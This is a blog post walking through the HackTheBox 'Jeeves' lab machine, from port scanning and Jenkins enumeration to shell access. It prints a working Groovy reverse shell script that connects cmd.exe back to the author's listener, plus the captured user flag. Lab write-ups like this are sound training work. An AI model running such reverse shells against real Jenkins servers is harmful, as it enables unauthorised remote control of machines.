---
id: 189
title: 'Jeeves &#8211; HacktheBox'
date: 2018-05-17T10:09:48+01:00
author: rowbot
layout: post
guid: http://offsecnewbie.com/?p=189
permalink: /2018/05/17/jeeves-hackthebox/
image: /wp-content/uploads/2018/05/Jeeves.png
categories:
  - Hackthebox
---
After getting the email that Jeeves will be retiring soon I thought I&#8217;d give it a go. This is the first Windows box that I&#8217;ve done in quite a while. Lets get into it

START

A quick nmap scan to see what ports are open. The -F tag is Fast mode &#8211; Scan fewer ports than the default scan.

<pre>[root:~/Desktop/jeeves]# nmap -F 10.10.10.63
Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-05-17 10:09 BST
Nmap scan report for 10.10.10.63
Host is up, received echo-reply ttl 127 (0.029s latency).
Not shown: 97 filtered ports
Reason: 97 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
80/tcp open http syn-ack ttl 127
135/tcp open msrpc syn-ack ttl 127
445/tcp open microsoft-ds syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 2.16 seconds</pre>

Looks like a webserver is available and remote desktop. While i do a full port scan I&#8217;ll load up Firefox and take a look at the website.

<img class="alignnone size-full wp-image-193" src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/website.png?resize=680%2C269" alt="" width="680" height="269" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/website.png?w=852 852w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/website.png?resize=300%2C119 300w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/website.png?resize=768%2C304 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

When I use the search it brings be to a page with an error &#8211; it looks like it is displaying a picture rather than html or other code

<img class="alignnone size-full wp-image-194" src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jeeves.png?resize=680%2C451" alt="" width="680" height="451" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jeeves.png?w=1212 1212w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jeeves.png?resize=300%2C199 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jeeves.png?resize=768%2C509 768w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jeeves.png?resize=1024%2C679 1024w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

The full port scan completed

<pre>Nmap scan report for 10.10.10.63 
Host is up, received echo-reply ttl 127 (0.035s latency).
 
PORT STATE SERVICE REASON VERSION 
80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_ Potentially risky methods: TRACE 
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open http syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
 
Host script results: 
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m57s
| smb-security-mode:
| account_used: guest 
| authentication_level: user 
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled but not required
| smb2-time: 
| date: 2018-05-09 02:02:11
|_ start_date: 2018-05-07 03:07:55</pre>

Port 50000 has a Jetty Server running. A quick Google reveals &#8220;_Eclipse Jetty provides a Web server and javax.servlet container, plus support for HTTP/2, WebSocket, OSGi, JMX, JNDI, JAAS and many other integrations. These components are open source and available for commercial use and distribution._&#8221; https://www.eclipse.org/jetty/

Checking to see what is on that webserver. Followed by a dirbuster on port 50000.

<img class="alignnone size-full wp-image-195" src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jettypic.png?resize=430%2C260" alt="" width="430" height="260" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jettypic.png?w=430 430w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jettypic.png?resize=300%2C181 300w" sizes="(max-width: 430px) 100vw, 430px" data-recalc-dims="1" /> 

<img class="alignnone size-full wp-image-196" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/dirbuster.png?resize=680%2C478" alt="" width="680" height="478" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/dirbuster.png?w=772 772w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/dirbuster.png?resize=300%2C211 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/dirbuster.png?resize=768%2C540 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

I browsed to the askjeeves directory and got what looks like a CMS called Jenkins.

<img class="alignnone size-full wp-image-197" src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins.png?resize=680%2C468" alt="" width="680" height="468" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins.png?w=816 816w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins.png?resize=300%2C206 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins.png?resize=768%2C528 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

A quick Google and it looks like Jenkins is a self-contained Java-based program, ready to run out-of-the-box, with packages for Windows, Mac OS X and other Unix-like operating systems.

<img class="alignnone size-full wp-image-198" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins-webby.png?resize=680%2C306" alt="" width="680" height="306" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins-webby.png?w=806 806w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins-webby.png?resize=300%2C135 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkins-webby.png?resize=768%2C346 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

I fired up Metasploit to see if it had a Jenkins module and sure enough it did have a few. I tried out one.

<pre>msf post(multi/gather/jenkins_gather) &gt; use auxiliary/scanner/http/jenkins_enum
msf auxiliary(scanner/http/jenkins_enum) &gt; show options

Module options (auxiliary/scanner/http/jenkins_enum):

Name Current Setting Required Description
 ---- --------------- -------- -----------
 Proxies no A proxy chain of format type:host:port[,type:host:port][...]
 RHOSTS 10.10.10.63 yes The target address range or CIDR identifier
 RPORT 50000 yes The target port (TCP)
 SSL false no Negotiate SSL/TLS for outgoing connections
 TARGETURI /askjeeves/ yes The path to the Jenkins-CI application
 THREADS 1 yes The number of concurrent threads
 VHOST no HTTP server virtual host

msf auxiliary(scanner/http/jenkins_enum) &gt; run

[+] [2018.05.17-11:02:57] 10.10.10.63:50000 - Jenkins Version 2.87
[+] [2018.05.17-11:02:57] http://10.10.10.63:50000/askjeeves/ - /askjeeves/script does not require authentication (200)
[+] [2018.05.17-11:02:57] http://10.10.10.63:50000/askjeeves/ - /askjeeves/view/All/newJob does not require authentication (200)
[+] [2018.05.17-11:02:57] http://10.10.10.63:50000/askjeeves/ - /askjeeves/asynchPeople/ does not require authentication (200)
[+] [2018.05.17-11:02:57] http://10.10.10.63:50000/askjeeves/ - /askjeeves/systemInfo does not require authentication (200)
[*] [2018.05.17-11:02:57] Getting useful information from systemInfo
 OS: Windows 10
 OS Version: 10.0
 Arch: x86
 User: kohsuke
 Domain: JEEVES
 Home Directory: C:\Users\kohsuke
 Language: en
 Country: US
 Timezone: America/New_York
 Computer Name: JEEVES
 System Drive: C:
 Temp Directory: C:\Users\kohsuke\AppData\Local\Temp
 Temp Directory: C:\Users\kohsuke\AppData\Local\Temp

[*] [2018.05.17-11:02:58] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/jenkins_enum) &gt; 

</pre>

So it is a Windows 10 box with a user kohsuke and the Jenkins application is v 2.87.

I browsed through the CMS and found a way to execute commands through a jar file I had to download

<img class="alignnone size-full wp-image-200" src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkinscli.png?resize=680%2C89" alt="" width="680" height="89" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkinscli.png?w=1235 1235w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkinscli.png?resize=300%2C39 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkinscli.png?resize=768%2C101 768w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/jenkinscli.png?resize=1024%2C134 1024w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> 

<pre>Looks like it worked

[root:~/Desktop/jeeves]# java -jar jenkins-cli.jar -s http://10.10.10.63:50000/askjeeves/ who-am-i (master✱) 
Authenticated as: anonymous
Authorities:
[root:~/Desktop/jeeves]#</pre>

Now what can I run? Noting useful by the looks of it

## Available Commands

<table>
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/add-job-to-view">add-job-to-view</a>
    </td>
    
    <td>
      Adds jobs to view.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/build">build</a>
    </td>
    
    <td>
      Builds a job, and optionally waits until its completion.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/cancel-quiet-down">cancel-quiet-down</a>
    </td>
    
    <td>
      Cancel the effect of the &#8220;quiet-down&#8221; command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/clear-queue">clear-queue</a>
    </td>
    
    <td>
      Clears the build queue.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/connect-node">connect-node</a>
    </td>
    
    <td>
      Reconnect to a node(s)
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/console">console</a>
    </td>
    
    <td>
      Retrieves console output of a build.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/copy-job">copy-job</a>
    </td>
    
    <td>
      Copies a job.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/create-credentials-by-xml">create-credentials-by-xml</a>
    </td>
    
    <td>
      Create Credential by XML
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/create-credentials-domain-by-xml">create-credentials-domain-by-xml</a>
    </td>
    
    <td>
      Create Credentials Domain by XML
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/create-job">create-job</a>
    </td>
    
    <td>
      Creates a new job by reading stdin as a configuration XML file.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/create-node">create-node</a>
    </td>
    
    <td>
      Creates a new node by reading stdin as a XML configuration.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/create-view">create-view</a>
    </td>
    
    <td>
      Creates a new view by reading stdin as a XML configuration.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/declarative-linter">declarative-linter</a>
    </td>
    
    <td>
      Validate a Jenkinsfile containing a Declarative Pipeline
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-builds">delete-builds</a>
    </td>
    
    <td>
      Deletes build record(s).
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-credentials">delete-credentials</a>
    </td>
    
    <td>
      Delete a Credential
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-credentials-domain">delete-credentials-domain</a>
    </td>
    
    <td>
      Delete a Credentials Domain
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-job">delete-job</a>
    </td>
    
    <td>
      Deletes job(s).
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-node">delete-node</a>
    </td>
    
    <td>
      Deletes node(s)
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/delete-view">delete-view</a>
    </td>
    
    <td>
      Deletes view(s).
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/disable-job">disable-job</a>
    </td>
    
    <td>
      Disables a job.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/disconnect-node">disconnect-node</a>
    </td>
    
    <td>
      Disconnects from a node.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/enable-job">enable-job</a>
    </td>
    
    <td>
      Enables a job.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-credentials-as-xml">get-credentials-as-xml</a>
    </td>
    
    <td>
      Get a Credentials as XML (secrets redacted)
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-credentials-domain-as-xml">get-credentials-domain-as-xml</a>
    </td>
    
    <td>
      Get a Credentials Domain as XML
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-gradle">get-gradle</a>
    </td>
    
    <td>
      List available gradle installations
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-job">get-job</a>
    </td>
    
    <td>
      Dumps the job definition XML to stdout.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-node">get-node</a>
    </td>
    
    <td>
      Dumps the node definition XML to stdout.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/get-view">get-view</a>
    </td>
    
    <td>
      Dumps the view definition XML to stdout.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/groovy">groovy</a>
    </td>
    
    <td>
      Executes the specified Groovy script.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/groovysh">groovysh</a>
    </td>
    
    <td>
      Runs an interactive groovy shell.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/help">help</a>
    </td>
    
    <td>
      Lists all the available commands or a detailed description of single command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/install-plugin">install-plugin</a>
    </td>
    
    <td>
      Installs a plugin either from a file, an URL, or from update center.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/install-tool">install-tool</a>
    </td>
    
    <td>
      Performs automatic tool installation, and print its location to stdout. Can be only called from inside a build. [deprecated]
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/keep-build">keep-build</a>
    </td>
    
    <td>
      Mark the build to keep the build forever.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-changes">list-changes</a>
    </td>
    
    <td>
      Dumps the changelog for the specified build(s).
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-credentials">list-credentials</a>
    </td>
    
    <td>
      Lists the Credentials in a specific Store
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-credentials-context-resolvers">list-credentials-context-resolvers</a>
    </td>
    
    <td>
      List Credentials Context Resolvers
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-credentials-providers">list-credentials-providers</a>
    </td>
    
    <td>
      List Credentials Providers
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-jobs">list-jobs</a>
    </td>
    
    <td>
      Lists all jobs in a specific view or item group.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/list-plugins">list-plugins</a>
    </td>
    
    <td>
      Outputs a list of installed plugins.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/login">login</a>
    </td>
    
    <td>
      Saves the current credentials to allow future commands to run without explicit credential information. [deprecated]
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/logout">logout</a>
    </td>
    
    <td>
      Deletes the credentials stored with the login command. [deprecated]
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/mail">mail</a>
    </td>
    
    <td>
      Reads stdin and sends that out as an e-mail.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/offline-node">offline-node</a>
    </td>
    
    <td>
      Stop using a node for performing builds temporarily, until the next &#8220;online-node&#8221; command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/online-node">online-node</a>
    </td>
    
    <td>
      Resume using a node for performing builds, to cancel out the earlier &#8220;offline-node&#8221; command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/quiet-down">quiet-down</a>
    </td>
    
    <td>
      Quiet down Jenkins, in preparation for a restart. Don’t start any builds.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/reload-configuration">reload-configuration</a>
    </td>
    
    <td>
      Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/reload-job">reload-job</a>
    </td>
    
    <td>
      Reload job(s)
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/remove-job-from-view">remove-job-from-view</a>
    </td>
    
    <td>
      Removes jobs from view.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/replay-pipeline">replay-pipeline</a>
    </td>
    
    <td>
      Replay a Pipeline build with edited script taken from standard input
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/restart">restart</a>
    </td>
    
    <td>
      Restart Jenkins.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/safe-restart">safe-restart</a>
    </td>
    
    <td>
      Safely restart Jenkins.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/safe-shutdown">safe-shutdown</a>
    </td>
    
    <td>
      Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/session-id">session-id</a>
    </td>
    
    <td>
      Outputs the session ID, which changes every time Jenkins restarts.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/set-build-description">set-build-description</a>
    </td>
    
    <td>
      Sets the description of a build.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/set-build-display-name">set-build-display-name</a>
    </td>
    
    <td>
      Sets the displayName of a build.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/set-build-parameter">set-build-parameter</a>
    </td>
    
    <td>
      Update/set the build parameter of the current build in progress. [deprecated]
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/set-build-result">set-build-result</a>
    </td>
    
    <td>
      Sets the result of the current build. Works only if invoked from within a build. [deprecated]
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/shutdown">shutdown</a>
    </td>
    
    <td>
      Immediately shuts down Jenkins server.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/update-credentials-by-xml">update-credentials-by-xml</a>
    </td>
    
    <td>
      Update Credentials by XML
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/update-credentials-domain-by-xml">update-credentials-domain-by-xml</a>
    </td>
    
    <td>
      Update Credentials Domain by XML
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/update-job">update-job</a>
    </td>
    
    <td>
      Updates the job definition XML from stdin. The opposite of the get-job command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/update-node">update-node</a>
    </td>
    
    <td>
      Updates the node definition XML from stdin. The opposite of the get-node command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/update-view">update-view</a>
    </td>
    
    <td>
      Updates the view definition XML from stdin. The opposite of the get-view command.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/version">version</a>
    </td>
    
    <td>
      Outputs the current version.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/wait-node-offline">wait-node-offline</a>
    </td>
    
    <td>
      Wait for a node to become offline.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/wait-node-online">wait-node-online</a>
    </td>
    
    <td>
      Wait for a node to become online.
    </td>
  </tr>
  
  <tr>
    <td>
      <a href="http://10.10.10.63:50000/askjeeves/cli/command/who-am-i">who-am-i</a>
    </td>
    
    <td>
      Reports your credential and permissions.
    </td>
  </tr>
</table>

I need to upload a reverse shell and run it.

<img class="alignnone size-full wp-image-201" src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?resize=680%2C250" alt="" width="680" height="250" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?w=1487 1487w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?resize=300%2C110 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?resize=768%2C282 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?resize=1024%2C376 1024w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2018/05/script.png?w=1360 1360w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /> I found this page and a Groovy reverse shell script on https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 I modified the ip and port and started a netcat listener.

<pre>String host="10.10.14.234";
int port=55555;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre>

Bingo!

<pre>[root:~/Desktop/jeeves]# nc -nlvp 55555 (master✱) 
listening on [any] 55555 ...
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.63] 49680
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins&gt;
</pre>

Time to capture the user flag

<pre>C:\Users\kohsuke\Desktop&gt;dir 
dir 
 Volume in drive C has no label. 
 Volume Serial Number is BE50-B1C9 
 
 Directory of C:\Users\kohsuke\Desktop 
 
11/03/2017 11:19 PM &lt;DIR&gt; . 
11/03/2017 11:19 PM &lt;DIR&gt; .. 
11/03/2017 11:22 PM 32 user.txt 
 1 File(s) 32 bytes 
 2 Dir(s) 7,165,026,304 bytes free 
 
C:\Users\kohsuke\Desktop&gt;type user.txt 
type user.txt 
e3232272596fb47950d59c4cf1e7066a</pre>

Now for priv esc. Lets see what OS version is running and look for exploits.

<pre>C:\&gt;systeminfo
systeminfo

Host Name: JEEVES
OS Name: Microsoft Windows 10 Pro
OS Version: <span style="color: #ff0000;"><strong>10.0.10586 N/A Build 10586</strong></span>
OS Manufacturer: Microsoft Corporation
OS Configuration: Standalone Workstation
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
Registered Organization:
Product ID: 00331-20304-47406-AA297
Original Install Date: 10/25/2017, 4:45:33 PM
System Boot Time: 5/16/2018, 2:50:22 PM
System Manufacturer: VMware, Inc.
System Model: VMware7,1
System Type: x64-based PC</pre>

&#8220;Researchers Discovered this Exploit in Microsoft Windows 10 Redstone 1 (August 2016) and specifically Target Microsoft Windows 10 x64 Version 1511 and The build number is Microsoft Windows 10.0.10586.&#8221; https://gbhackers.com/nsa-malware-eternalblue-successfully-exploit-and-port-into-microsoft-windows-10/

So I&#8217;ve learned that Windows 10 is also vulnerable to Eternal Blue. I tried finding the Windows 10 exploit but couldn&#8217;t and the Windows 7 one doesn&#8217;t work ( i tried it).

After poking about the server i found a keypass file.

<pre>C:\Users\kohsuke\Documents&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

Directory of C:\Users\kohsuke\Documents

11/03/2017 11:18 PM &lt;DIR&gt; .
11/03/2017 11:18 PM &lt;DIR&gt; ..
<span style="color: #ff0000;"><strong>09/18/2017 01:43 PM 2,846 CEH.kdbx</strong></span>
 1 File(s) 2,846 bytes
 2 Dir(s) 7,032,320,000 bytes free</pre>

I could not get it downloaded to my machine. If it was on a Linux but it would be a lot easier but a netcat connection on a Windows box made it impossible ( for me ).

Summary

I didn&#8217;t learn much on this box other than to search for files in DOS.

<pre>dir fileyouwant.whatever /s /p</pre>

Disappointed that I was unable to figure out how to transfer the file to my box. Please add a comment on how you would have done it.

FIN